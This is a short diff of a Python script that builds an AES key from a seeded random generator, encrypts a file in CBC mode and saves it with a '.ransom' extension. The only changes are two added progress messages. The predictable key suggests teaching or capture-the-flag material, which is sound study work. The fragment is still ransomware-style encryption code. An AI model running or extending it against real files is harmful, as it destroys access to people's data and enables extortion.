@@ -19,6 +19,7 @@ random.seed(seed)
 #print(seed)
 
 # generate 128-bit data encryption key
+print('\ngenerating a random encryption key...')
 key = bytearray()
 for i in range(16):
   key.append(random.randint(0,255))
@@ -28,11 +29,12 @@ with open(fname, 'rb') as file:
   plain = file.read()
 
 # generate IV and encrypt the file
+print('encrypting the file...')
 iv  = Random.new().read(16)
 cipher = AES.new(key, AES.MODE_CBC, iv)
 encrypted = cipher.encrypt(pad(plain, AES.block_size))
 
-# store the encrypted file 
+# store the encrypted file
 fnameEnc = re.sub('\..+', '.ransom', fname)
 with open(fnameEnc, 'wb') as file:
   file.write(iv + encrypted)
